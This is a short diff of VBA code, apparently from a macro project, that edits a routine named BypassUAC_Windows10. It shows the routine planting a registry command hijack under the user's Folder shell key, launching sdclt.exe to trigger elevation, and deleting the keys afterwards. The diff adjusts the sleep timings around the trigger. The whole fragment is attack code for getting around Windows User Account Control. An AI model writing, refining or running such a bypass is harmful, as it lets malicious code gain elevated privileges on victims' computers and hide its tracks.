@@ -17,8 +17,9 @@ Private Sub BypassUAC_Windows10 (targetPath As String)
     wshUac.RegWrite regKeyCommand2, "", "REG_SZ"
     
     'trigger the bypass
+    MySleep 1
     ExecuteCmdAsync  "cmd.exe /c sdclt.exe"  
-    MySleep 3
+    MySleep 2
     
     ' Remove keys
     wshUac.RegDelete  "HKCU\Software\Classes\Folder\Shell\Open\Command\"
